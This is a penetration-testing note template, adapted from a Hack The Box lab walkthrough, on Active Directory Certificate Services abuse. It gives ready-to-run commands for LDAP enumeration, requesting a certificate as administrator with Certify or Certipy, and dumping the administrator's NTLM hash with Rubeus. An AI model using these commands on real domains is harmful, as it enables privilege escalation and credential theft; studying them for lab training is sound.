


## 1- basic enumeration
```powershell
ldapsearch -H ldap://<% tp.frontmatter["RHOSTS"] %>  -x -b"DC=vault,DC=offsec" > ldap_dump.txt # if the DC is : vault.offsec, it will be like that
```

## 2- Identify ADCS

```powershell
crackmapexec ldap <% tp.frontmatter["RHOSTS"] %> -u <% tp.frontmatter["domain-username"] %> -p <% tp.frontmatter["domain-password"] %> -M adcs
```

![600](Assets/Pasted%20image%2020251123233434.png)
if "Found CN: domain-DC-CA" found, 

- Identify Vulnerable template
With ADCS running, the next question is if there are any templates in this ADCS that are insecurely configured.
To enumerate further, I’ll upload a copy of [Certify](https://github.com/GhostPack/Certify) by downloading a copy from [SharpCollection](https://github.com/Flangvik/SharpCollection/tree/master/NetFramework_4.7_Any), and uploading it to Escape:

download it 
```powershell
wget https://github.com/Flangvik/SharpCollection/raw/refs/heads/master/NetFramework_4.7_Any/Certify.exe
```

upload it via evil-winrm
```powershell
upload Certify.exe
```
![600](Assets/Pasted%20image%2020251123234116.png)
The README for Certify has walkthrough of how to enumerate and abuse certificate services. First it shows running `Certify.exe find /vulnerable`. By default, this looks across standard low privilege groups. I like to add `/currentuser` to instead look across the groups for the current user, but both are valuable depending on the scenario.

After printing some information about the Enterprise CA, it then lists a single vulnerable certificate template:

```powershell
.\Certify.exe find /vulnerable /currentuser
```
![600](Assets/Pasted%20image%2020251123234107.png)
The danger here is that `sequel\Domain Users` has Enrollment Rights for the certificate (this is scenario 3 in the Certify README).

**Abuse Template with [[Certify]] / [[Rebeus]]**

I can continue with the README scenario 3 by next running `Certify.exe` to request a certificate with an alternative name of administrator. 
It returns a `cert.pem`:

```powershell
.\Certify.exe request /ca:dc.sequel.htb\sequel-DC-CA /template:UserAuthentication /altname:administrator
```
![600](Assets/Pasted%20image%2020251123235547.png)
Both the README and the end of that output show the next step. 
I’ll copy everything from `-----BEGIN RSA PRIVATE KEY-----` to `-----END CERTIFICATE-----` into a file on my host and convert it to a `.pfx` using the command given, entering no password when prompted:

insert everything here
```powershell
subl cert.pem
```

convert it to cert.pfx
```powershell
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```

I’ll upload `cert.pfx`, as well as a copy of [Rubeus](https://github.com/GhostPack/Rubeus) (downloaded from [SharpCollection](https://github.com/Flangvik/SharpCollection)), and then run the `asktgt` command, passing it the certificate to get a TGT as administrator:

1- **Rebeus way**
download [[Rubeus]]
```powershell
wget https://github.com/Flangvik/SharpCollection/raw/refs/heads/master/NetFramework_4.0_Any/Rubeus.exe
```

then upload it 
```powershell
upload Rubeus.exe
```

run it 
```powershell
.\Rubeus.exe asktgt /user:administrator /certificate:C:\programdata\cert.pfx
```

It works! However, Rubeus tries to load the returned ticket directly into the current session, so in theory, once I run this I could just enter administrator’s folders and get the flag. However, this doesn’t work over Evil-WinRM.

Instead, I’m going to run the same command with `/getcredentials /show /nowrap`. This will do the same thing, _and_ try to dump credential information about the account:
```powershell
.\Rubeus.exe asktgt /user:administrator /certificate:C:\programdata\cert.pfx /getcredentials /show /nowrap
```
![600](Assets/Pasted%20image%2020251124003618.png)
The last line is the NTLM hash for the administrator account.
![600](Assets/Pasted%20image%2020251124003639.png)


2- **With [[security/network/notes/07-ad-enumeration/04-adcs-assesment/AD CS Tools/certipy]]** 
An alternative tool to accomplish the same thing is [Certipy](https://github.com/ly4k/Certipy), which is nice because I can run it remotely from my VM. It has a `find` command that will identify the vulnerable template:
```powershell
certipy find -u ryan.cooper -p NuclearMosquito3 -target sequel.htb -text -stdout -vulnerable
```
And `req` allows me to get the `.pfx` certificate just like I did with `Certify.exe` and `openssl` above:
```powershell
certipy req -u ryan.cooper -p NuclearMosquito3 -target sequel.htb -upn administrator@sequel.htb -ca sequel-dc-ca -template UserAuthentication
```
The `auth` command will take that certificate (`administrator.pfx`) and get the hash.
```powershell
certipy auth -pfx administrator.pfx
```
results:
```powershell
oxdf@hacky$ certipy auth -pfx administrator.pfx
Certipy v4.4.0 - by Oliver Lyak (ly4k) 
 
[*] Using principal: administrator@sequel.htb 
[*] Trying to get TGT... 
[-] Got error while trying to request TGT: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```

I noted above that there was an eight hour different in clock times. I can sync the clock with Escape using `ntpdate`:
```powershell
sudo ntpdate -u sequel.htb
```

This typically kills my VPN session with HTB, but after reconnecting, I’m able to dump the hash:
```powershell
certipy auth -pfx administrator.pfx
```

![600](Assets/Pasted%20image%2020251124004106.png)

after that update the hash and login with [Evil-WinRM](6-%20Zettelkasten/Evil-WinRM.md)


## 3- other commands 

```powershell
ldapsearch -x -H ldap://<% tp.frontmatter["RHOSTS"] %> -D '' -w '' -b "DC=<1_SUBDOMAIN>,DC=<TLD>"
ldapsearch -x -H ldap://<% tp.frontmatter["RHOSTS"] %> -D '<% tp.frontmatter["VHOST"] %>\<% tp.frontmatter["domain-username"] %>' -w '<% tp.frontmatter["domain-password"] %>' -b "DC=<1_SUBDOMAIN>,DC=<TLD>"
#CN name describes the info we're collecting
ldapsearch -x -H ldap://<% tp.frontmatter["RHOSTS"] %> -D '<% tp.frontmatter["VHOST"] %>\<% tp.frontmatter["domain-username"] %>' -w '<% tp.frontmatter["domain-password"] %>' -b "CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
ldapsearch -x -H ldap://<% tp.frontmatter["RHOSTS"] %> -D '<% tp.frontmatter["VHOST"] %>\<% tp.frontmatter["domain-username"] %>' -w '<% tp.frontmatter["domain-password"] %>' -b "CN=Computers,DC=<1_SUBDOMAIN>,DC=<TLD>"
ldapsearch -x -H ldap://<% tp.frontmatter["RHOSTS"] %> -D '<% tp.frontmatter["VHOST"] %>\<% tp.frontmatter["domain-username"] %>' -w '<% tp.frontmatter["domain-password"] %>' -b "CN=Domain Admins,CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
ldapsearch -x -H ldap://<% tp.frontmatter["RHOSTS"] %> -D '<% tp.frontmatter["VHOST"] %>\<% tp.frontmatter["domain-username"] %>' -w '<% tp.frontmatter["domain-password"] %>' -b "CN=Domain Users,CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
ldapsearch -x -H ldap://<% tp.frontmatter["RHOSTS"] %> -D '<% tp.frontmatter["VHOST"] %>\<% tp.frontmatter["domain-username"] %>' -w '<% tp.frontmatter["domain-password"] %>' -b "CN=Enterprise Admins,CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
ldapsearch -x -H ldap://<% tp.frontmatter["RHOSTS"] %> -D '<% tp.frontmatter["VHOST"] %>\<% tp.frontmatter["domain-username"] %>' -w '<% tp.frontmatter["domain-password"] %>' -b "CN=Administrators,CN=Builtin,DC=<1_SUBDOMAIN>,DC=<TLD>"
ldapsearch -x -H ldap://<% tp.frontmatter["RHOSTS"] %> -D '<% tp.frontmatter["VHOST"] %>\<% tp.frontmatter["domain-username"] %>' -w '<% tp.frontmatter["domain-password"] %>' -b "CN=Remote Desktop Users,CN=Builtin,DC=<1_SUBDOMAIN>,DC=<TLD>"

#windapsearch.py
#for computers
python3 windapsearch.py --dc-ip <% tp.frontmatter["RHOSTS"] %> -u <% tp.frontmatter["domain-username"] %> -p <% tp.frontmatter["domain-password"] %> --computers

#for groups
python3 windapsearch.py --dc-ip <% tp.frontmatter["RHOSTS"] %> -u <% tp.frontmatter["domain-username"] %> -p <% tp.frontmatter["domain-password"] %> --groups

#for users
python3 windapsearch.py --dc-ip <% tp.frontmatter["RHOSTS"] %> -u <% tp.frontmatter["domain-username"] %> -p <% tp.frontmatter["domain-password"] %> --da

#for privileged users
python3 windapsearch.py --dc-ip <% tp.frontmatter["RHOSTS"] %> -u <% tp.frontmatter["domain-username"] %> -p <% tp.frontmatter["domain-password"] %> --privileged-users
```
